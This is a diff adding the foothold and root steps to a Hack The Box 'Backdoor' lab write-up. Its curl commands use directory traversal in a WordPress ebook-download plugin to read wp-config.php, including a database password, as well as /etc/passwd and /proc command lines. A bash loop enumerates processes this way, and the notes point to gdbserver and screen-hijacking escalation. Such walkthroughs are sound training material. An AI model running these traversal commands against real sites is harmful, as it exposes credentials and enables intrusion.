@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/backdoor.png
-tags: ["HTB"]
+tags: ["HTB", "wordpress","wpscan", "directory-traversal", "ebooks-download", "proc", "bash", "msfvenom", "gdb", "gdbserver", "gdb-remote", "screen"]
 ---
 
 # Backdoor
@@ -214,6 +214,141 @@ Interesting Finding(s):
 ![](./images/3.png) 
 
 ## Foothold/User
+- We can confirm that `ebook` plugin is vulnerable
+  - https://www.exploit-db.com/exploits/39575
 
+```
+└─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php                                                                                                   
+../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+...
+```
+
+- Creds didn't work, let's check `/etc/passwd`
+
+```
+└─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd
+../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+<script>window.close()</script>            
+```
+
+- Let's check the current process
+```
+└─$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o-      
+../../../../../../../proc/self/cmdline../../../../../../../proc/self/cmdline../../../../../../../proc/self/cmdline/usr/sbin/apache2-kstart<script>window.close()</script>
+```
+- We can see the process, let's parse it
+```
+└─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr '\000' ' ' | cut -c115- | rev | cut -c32- | rev
+/usr/sbin/apache2 -k start
+```
+- We can try checking every process
+  - `script`
+  - Had issues with parsing, but did the work
+```bash
+#!/bin/bash
+
+for i in {500..5000}; do
+        proc="/proc/$i/cmdline"
+        skip=$((${#proc})) 
+        res=$(curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../${proc} | tr '\000' ' ' |  cut -c $skip- | rev | cut -c 32- | rev) 
+        
+        if [[ -n "$res" ]]; then
+                echo "$i: $res"
+        fi
+done;
+```
+
+- As a result we have the port we saw in `nmap` results
+  - `/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done`
+```
+857: ../../..//proc/857/cmdline../../../../../../..//proc/857/cmdline/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
+```
+
+- We can follow [Hacktricks's post](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) or use `msfconsole`
+  - Got user
+
+![](./images/4.png)
 
 ## Root
+- Enumerate
+  - We see `screen` running as `root`
+
+![](./images/5.png)
+
+- Let's abuse it
+  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#screen-sessions-hijacking
+
+![](./images/6.png)
+
+![](./images/7.png)
